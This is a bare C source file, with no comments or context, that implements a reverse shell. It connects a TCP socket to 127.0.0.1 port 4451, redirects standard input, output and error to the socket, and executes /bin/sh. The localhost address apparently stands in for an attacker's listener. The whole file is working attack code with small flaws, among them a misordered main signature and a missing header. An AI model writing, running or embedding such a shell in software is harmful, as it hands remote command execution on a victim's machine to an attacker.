#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <unistd.h>

#define PORT 4451

int main(char* arg[], int argv){
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    inet_aton("127.0.0.1", &addr.sin_addr.s_addr);

    int sockFD = socket(AF_INET, SOCK_STREAM, 0);


    int sizeOfAddr = sizeof(addr);
    
    connect(sockFD, (struct sockaddr *) &addr, sizeOfAddr);

    dup2(sockFD, STDOUT_FILENO);
    dup2(sockFD, STDIN_FILENO);
    dup2(sockFD, STDERR_FILENO);

    char *argvV[] = {"/bin/sh",NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argvV, envp );

    return 0;
}
